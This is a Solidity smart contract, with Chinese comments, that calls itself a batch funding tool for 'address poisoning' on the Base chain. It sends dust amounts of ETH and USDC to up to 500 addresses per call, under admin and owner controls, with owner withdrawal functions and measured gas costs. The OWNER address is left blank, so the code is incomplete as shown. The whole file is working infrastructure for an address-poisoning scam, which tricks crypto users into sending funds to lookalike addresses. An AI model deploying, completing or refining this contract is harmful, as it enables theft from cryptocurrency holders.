// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/**
 * @title BatchPoisonerBase
 * @notice Base链地址投毒批量充值合约
 * @dev 只支持 ETH + USDC (Base链官方USDC, 6位小数!)
 * 
 * Base链特点:
 * - 原生币: ETH (18位小数)
 * - USDC: 6位小数 (不是18位!)
 * - Gas极低: ~0.003-0.004 Gwei
 * - ChainID: 8453 (主网)
 * 
 * 实测数据:
 * - 单笔转账gas: ~40,247, 费用: ~0.00000015 ETH
 * - 批量11地址gas: ~488,338, 每地址: ~44,394 gas
 */

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract BatchPoisonerBase {
    // Base链 USDC (官方, 6位小数!)
    IERC20 public constant USDC = IERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);

    // 固定主管理员地址 (部署前修改为你的地址!)
    address public constant OWNER = ;

    mapping(address => bool) public admins;

    // 默认充值金额
    // ETH: 0.0000005 ETH = 500000000000 wei (足够1笔转账gas ~0.00000015 ETH)
    // USDC: 0.0001 USDC = 100 最小单位 (6位小数, 智能投毒最大99)
    uint128 public defaultETHAmount  = 500000000000;  // 0.0000005 ETH
    uint128 public defaultUSDCAmount = 100;           // 0.0001 USDC

    uint256 public constant MAX_BATCH_SIZE = 500;

    event BatchTransfer(uint256 count, uint256 ethTotal, uint256 usdcTotal);
    event AmountsUpdated(uint128 ethAmount, uint128 usdcAmount);
    event AdminAdded(address indexed admin);
    event AdminRemoved(address indexed admin);

    error NotAuthorized();
    error NotOwner();
    error BatchTooLarge();
    error InsufficientETH();
    error InsufficientUSDC();
    error TransferFailed();
    error InvalidAddress();

    modifier onlyOwner() {
        if (msg.sender != OWNER) revert NotOwner();
        _;
    }

    modifier onlyAdmin() {
        if (msg.sender != OWNER && !admins[msg.sender]) revert NotAuthorized();
        _;
    }

    constructor() {
        admins[OWNER] = true;
        emit AdminAdded(OWNER);
    }

    function addAdmin(address _admin) external onlyOwner {
        if (_admin == address(0)) revert InvalidAddress();
        if (!admins[_admin]) {
            admins[_admin] = true;
            emit AdminAdded(_admin);
        }
    }

    function addAdmins(address[] calldata _admins) external onlyOwner {
        for (uint256 i; i < _admins.length;) {
            address admin = _admins[i];
            if (admin != address(0) && !admins[admin]) {
                admins[admin] = true;
                emit AdminAdded(admin);
            }
            unchecked { ++i; }
        }
    }

    function removeAdmin(address _admin) external onlyOwner {
        if (_admin == OWNER) revert InvalidAddress();
        if (admins[_admin]) {
            admins[_admin] = false;
            emit AdminRemoved(_admin);
        }
    }

    function isAdmin(address _addr) external view returns (bool) {
        return _addr == OWNER || admins[_addr];
    }

    /// @notice 批量充值 ETH + USDC (主要方法, 兼容BSC的batchTransferBNBAndUSDC)
    function batchTransferBNBAndUSDC(address[] calldata recipients) external payable onlyAdmin {
        uint256 len = recipients.length;
        if (len > MAX_BATCH_SIZE) revert BatchTooLarge();

        uint256 ethAmt  = defaultETHAmount;
        uint256 usdcAmt = defaultUSDCAmount;
        uint256 totalETH  = ethAmt * len;
        uint256 totalUSDC = usdcAmt * len;

        if (address(this).balance < totalETH) revert InsufficientETH();
        if (USDC.balanceOf(address(this)) < totalUSDC) revert InsufficientUSDC();

        for (uint256 i; i < len;) {
            address to = recipients[i];
            (bool ethOk, ) = to.call{value: ethAmt, gas: 5000}("");
            if (!ethOk) revert TransferFailed();
            if (!USDC.transfer(to, usdcAmt)) revert TransferFailed();
            unchecked { ++i; }
        }

        emit BatchTransfer(len, totalETH, totalUSDC);
    }

    /// @notice 兼容旧接口
    function batchTransferBoth(address[] calldata recipients) external payable onlyAdmin {
        this.batchTransferBNBAndUSDC(recipients);
    }

    /// @notice 批量只充 ETH
    function batchTransferETH(address[] calldata recipients) external payable onlyAdmin {
        uint256 len = recipients.length;
        if (len > MAX_BATCH_SIZE) revert BatchTooLarge();
        uint256 amt = defaultETHAmount;
        uint256 total = amt * len;
        if (address(this).balance < total) revert InsufficientETH();
        for (uint256 i; i < len;) {
            (bool ok, ) = recipients[i].call{value: amt, gas: 5000}("");
            if (!ok) revert TransferFailed();
            unchecked { ++i; }
        }
        emit BatchTransfer(len, total, 0);
    }

    /// @notice 批量只充 USDC
    function batchTransferUSDC(address[] calldata recipients) external onlyAdmin {
        uint256 len = recipients.length;
        if (len > MAX_BATCH_SIZE) revert BatchTooLarge();
        uint256 amt = defaultUSDCAmount;
        uint256 total = amt * len;
        if (USDC.balanceOf(address(this)) < total) revert InsufficientUSDC();
        for (uint256 i; i < len;) {
            if (!USDC.transfer(recipients[i], amt)) revert TransferFailed();
            unchecked { ++i; }
        }
        emit BatchTransfer(len, 0, total);
    }

    // ==================== 设置 (仅主管理员) ====================

    /// @notice 设置默认充值金额 (兼容BSC 4参数接口)
    function setDefaultAmounts(
        uint256 _ethAmount,
        uint256, // _usdtAmount 忽略 (Base链不用)
        uint256 _usdcAmount,
        uint256  // _wbnbAmount 忽略 (Base链不用)
    ) external onlyOwner {
        defaultETHAmount  = uint128(_ethAmount);
        defaultUSDCAmount = uint128(_usdcAmount);
        emit AmountsUpdated(uint128(_ethAmount), uint128(_usdcAmount));
    }

    // ==================== 提现 (仅主管理员) ====================

    function withdrawETH() external onlyOwner {
        uint256 bal = address(this).balance;
        if (bal > 0) {
            (bool ok, ) = OWNER.call{value: bal}("");
            if (!ok) revert TransferFailed();
        }
    }

    function withdrawUSDC() external onlyOwner {
        uint256 bal = USDC.balanceOf(address(this));
        if (bal > 0) {
            if (!USDC.transfer(OWNER, bal)) revert TransferFailed();
        }
    }

    function withdrawAll() external onlyOwner {
        uint256 ethBal = address(this).balance;
        if (ethBal > 0) {
            (bool ok, ) = OWNER.call{value: ethBal}("");
            if (!ok) revert TransferFailed();
        }
        uint256 usdcBal = USDC.balanceOf(address(this));
        if (usdcBal > 0) USDC.transfer(OWNER, usdcBal);
    }

    // ==================== 查询 ====================

    function getBalances() external view returns (
        uint256 ethBalance,
        uint256 usdcBalance
    ) {
        return (address(this).balance, USDC.balanceOf(address(this)));
    }

    function getDefaultAmounts() external view returns (
        uint256 ethAmount,
        uint256 usdcAmount
    ) {
        return (defaultETHAmount, defaultUSDCAmount);
    }

    receive() external payable {}
}

